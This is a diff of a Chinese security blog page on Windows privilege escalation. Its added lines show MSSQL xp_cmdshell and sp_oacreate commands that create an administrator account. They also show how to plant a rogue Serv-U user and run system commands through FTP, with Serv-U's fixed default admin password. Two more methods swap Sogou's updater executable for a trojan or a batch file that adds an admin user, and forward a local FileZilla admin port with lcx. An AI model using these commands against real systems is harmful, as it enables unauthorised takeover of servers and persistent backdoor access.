@@ -6,7 +6,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    提权与后门维持 |  Ech0-w&#39; Blog
+    提权 |  Ech0-w&#39; Blog
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -31,7 +31,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-提权与后门维持" class="article article-type-post" itemscope
+  <article id="post-提权" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -39,7 +39,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  提权与后门维持
+  提权
 </h1>
   
 
@@ -48,7 +48,7 @@
 
     
     <div class="article-meta">
-      <a href="/2020/04/01/%E6%8F%90%E6%9D%83%E4%B8%8E%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/" class="article-date">
+      <a href="/2020/04/01/%E6%8F%90%E6%9D%83/" class="article-date">
   <time datetime="2020-04-01T11:02:56.000Z" itemprop="datePublished">2020-04-01</time>
 </a>
       
@@ -63,7 +63,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.9k字</span>
+            <span class="post-count">3.8k字</span>
         </span>
     </span>
 
@@ -72,7 +72,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">12分钟</span>
+            <span class="post-count">15分钟</span>
         </span>
     </span>
 </div>
@@ -99,7 +99,7 @@
       
 
       
-      <h1 id="提权与后门维持"><a href="#提权与后门维持" class="headerlink" title="提权与后门维持"></a>提权与后门维持</h1><ul>
+      <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul>
 <li>拿下网站!=拿下网站服务器；<br>  拿下网站=获得webshell，拿下网站服务器=拿下root（system）权限<br>  拿下网站服务器也不一定拿下网站，可能站库分离，有单独的数据库服务器</li>
 <li>网站webshell权限解析：<br>  一般情况下，webshell权限介于guests-users之间，权限较小<br>  非一般情况下，由以下两点决定：<ol>
 <li>脚本类型<br><strong>asp、php（小于users，匿名权限）&lt; aspx（users）&lt; jsp(system)</strong></li>
@@ -275,7 +275,7 @@
 </ul>
 </li>
 </ul>
-<h5 id="6-1-2nullevt-mof提权"><a href="#6-1-2nullevt-mof提权" class="headerlink" title="6.1.2nullevt.mof提权"></a>6.1.2nullevt.mof提权</h5><p><em>前提：1.windows2003及以下版本；2.mysql启动身份具有目录<code>c:/windows/system32/wbem/mof/</code>的读写权限；3.secure_file_priv参数值不为null。</em></p>
+<h5 id="6-1-2nullevt-mof提权"><a href="#6-1-2nullevt-mof提权" class="headerlink" title="6.1.2nullevt.mof提权"></a>6.1.2nullevt.mof提权</h5><p><em>前提：1.windows2003及以下版本；2.mysql启动身份具有目录<code>c:/windows/system32/wbem/mof/</code>的读写权限；3.secure_file_priv参数值不为null。(直接用mysql写入时的条件)</em></p>
 <ul>
 <li>mof文件是mysql数据库的扩展文件，路径<code>c:/windows/system32/wbem/mof/nullevt.mof</code>,叫做托管对象格式；其作用每隔5秒就去监控进程的创建和死亡。</li>
 <li><strong>原理</strong>：利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</li>
@@ -324,7 +324,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>使用xp_cmdshell提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user hack 12345 &#x2F;add&#39;    添加用户hack，密码12345</span><br><span class="line">exec master..xp_cmdshell &#39;net localgroup administrators hack add&#39;    添加hack用户到管理员组</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user hack 12345 &#x2F;add&#39;    &#x2F;&#x2F;添加用户hack，密码12345</span><br><span class="line">exec master..xp_cmdshell &#39;net localgroup administrators hack &#x2F;add&#39;    &#x2F;&#x2F;添加hack用户到管理员组</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>xp_cmshell关闭</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</span><br></pre></td></tr></table></figure>
@@ -335,8 +335,51 @@
 <h5 id="6-2-2利用sp-oacreate提权"><a href="#6-2-2利用sp-oacreate提权" class="headerlink" title="6.2.2利用sp_oacreate提权"></a>6.2.2利用sp_oacreate提权</h5><ol>
 <li>sp_oacreate开启<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure;</span><br><span class="line">exec sp_configure &#39;ole automation procedures&#39;,1;recofigure;</span><br></pre></td></tr></table></figure></li>
 <li>使用sp_oacreate提权<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c net user hack 123456 &#x2F;add&#39;</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c net localgroup administrators hack &#x2F;add&#39;</span><br></pre></td></tr></table></figure></li>
-<li>sp_pacreate关闭<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure;</span><br><span class="line">exec sp_configure &#39;ole automation procedures&#39;,0;reconfigure;</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;,0;reconfigure;</span><br></pre></td></tr></table></figure></li>
+<li>sp_pacreate关闭<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure;</span><br><span class="line">exec sp_configure &#39;ole automation procedures&#39;,0;reconfigure;</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;,0;reconfigure;</span><br></pre></td></tr></table></figure>
+
+</li>
 </ol>
+<h3 id="7-第三方软件漏洞提权"><a href="#7-第三方软件漏洞提权" class="headerlink" title="7.第三方软件漏洞提权"></a>7.第三方软件漏洞提权</h3><h4 id="7-1-FTP服务器软件Server-U"><a href="#7-1-FTP服务器软件Server-U" class="headerlink" title="7.1 FTP服务器软件Server-U"></a>7.1 FTP服务器软件Server-U</h4><ul>
+<li>默认端口:43958</li>
+<li>配置文件：<code>ServUDaemon.ini</code></li>
+</ul>
+<h5 id="7-1-1-webshell有权限修改配置文件"><a href="#7-1-1-webshell有权限修改配置文件" class="headerlink" title="7.1.1. webshell有权限修改配置文件"></a>7.1.1. webshell有权限修改配置文件</h5><ol>
+<li>修改domain添加用户：<code>user2=hack|1|0</code></li>
+<li>然后在ServUDaemon.ini文件尾部追下如下代码来添加用户的详细信息：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[USER&#x3D;spiger|1]</span><br><span class="line">Password&#x3D;md5加密后的密码</span><br><span class="line">HomeDir&#x3D;c:\</span><br><span class="line">RelPaths&#x3D;3</span><br><span class="line">TimeOut&#x3D;600</span><br><span class="line">Maintenance&#x3D;System</span><br><span class="line">Access1&#x3D;C:\|RWAMELCDP</span><br><span class="line">Access2&#x3D;d:\|RWAMELCDP</span><br><span class="line">Access3&#x3D;e:\|RWAMELCDP</span><br><span class="line">SKEYValues&#x3D;</span><br></pre></td></tr></table></figure></li>
+<li>使用添加的用户名密码登陆ftp服务器增加操作系统用户<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt;quote site exec net user hack 123456 &#x2F;add</span><br><span class="line">ftp&gt;quote site exec net localgroup administrators hack &#x2F;add</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h5 id="7-1-2-webshell无权限修改配置文件-但是可以看到配置文件"><a href="#7-1-2-webshell无权限修改配置文件-但是可以看到配置文件" class="headerlink" title="7.1.2. webshell无权限修改配置文件,但是可以看到配置文件"></a>7.1.2. webshell无权限修改配置文件,但是可以看到配置文件</h5><ul>
+<li>查看配置文件<code>ServUDaemon.ini</code>，找到system权限的ftp用户并把密码md5解密。</li>
+<li>使用已知的ftp系统用户名密码添加操作系统用户 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt;quote site exec net user hack 123456 &#x2F;add</span><br><span class="line">ftp&gt;quote site exec net localgroup administrators hack &#x2F;add</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="7-1-3-serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权"><a href="#7-1-3-serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权" class="headerlink" title="7.1.3. serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权"></a>7.1.3. serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权</h5><ul>
+<li>最常用的方法，一般大马中集成的serv-u提权方法就是本方法</li>
+<li>serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是<code>LocalAdministrator</code>,默认密码是<code>#l@$ak#.lk;0@P</code>，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。</li>
+<li>网站管理员很少修改serv-u的这个默认管理账号和口令，但是如果管理员修改了，我们还可以通过查看ServUAdmin.exe文件来获取管理账号和口令。方法如下：下载serv-u目录下的ServUAdmin.exe文件，在本地用winhex打开，查找LocalAdministrator字符来获取口令位置，通常可以看到serv-u的管理账号和口令都在文件中，仔细查找即可（如果连用户名也修改了，就搜127.0.0.1或记住账号和密码在文件中的位置）。获取管理账号和口令后就可以利用大马自带的serv-u来进行提权了。</li>
+</ul>
+<h4 id="7-2-sougou输入法提权"><a href="#7-2-sougou输入法提权" class="headerlink" title="7.2 sougou输入法提权"></a>7.2 sougou输入法提权</h4><ul>
+<li>搜狗低版本输入法根目录下有一个：<code>PinyinUp.exe</code>是用来更新词典用的，管理员为了保存词库，有可能会把搜狗输入法安装到D盘，搜狗输入法目录默认是Everyone可读可写，搜狗每隔一段时间就会自动升级，而升级的文件是PinyinUp.exe，我们直接对PinyinUp.exe 文件捆绑上远控等下次重启就会上线了。我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</li>
+<li><code>.bat</code>批处理文件使用工具生成<code>.exe</code>文件<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">@<span class="built_in">net</span> user hack <span class="number">12345</span> /add</span><br><span class="line">@<span class="built_in">net</span> localgroup administrators hack /add</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="7-3-filezilla提权"><a href="#7-3-filezilla提权" class="headerlink" title="7.3. filezilla提权"></a>7.3. filezilla提权</h4><ul>
+<li>ftp软件</li>
+<li>默认监听端口：14147（只监听本地端口）</li>
+<li>重要文件：管理文件<code>FileZilla Server Interface.xml</code> 用户文件<code>FileZilla Server.xml</code></li>
+<li>操作流程：<ul>
+<li>查找重要文件，查看管理员密码</li>
+<li>端口转发（因为只监听本地端口）<code>lcx.exe -tran 14148 127.0.0.1 14147</code>把任意地址的14148端口连接转发到本地的14147端口</li>
+<li>本地通过 FileZilla 的服务端程序，来连接它，地址为目标机地址，端口为14148，密码为之前查看的密码</li>
+<li>使用FileZilla 的服务端程序添加ftp用户，并将分享目录设置为<code>C:\</code>盘，赋予足够大的权限。</li>
+<li>使用ftp客户端软件连接</li>
+</ul>
+</li>
+</ul>
 
       
       <!-- reward -->
@@ -406,7 +449,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/04/01/%E6%8F%90%E6%9D%83%E4%B8%8E%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/04/01/%E6%8F%90%E6%9D%83/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -423,6 +466,15 @@
   
   
   <nav class="article-nav">
+    
+      <a href="/2020/04/08/%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            后门与权限维持
+          
+        </div>
+      </a>
     
     
       <a href="/2020/03/23/%E5%8F%8D%E5%BC%B9shell/" class="article-nav-link">
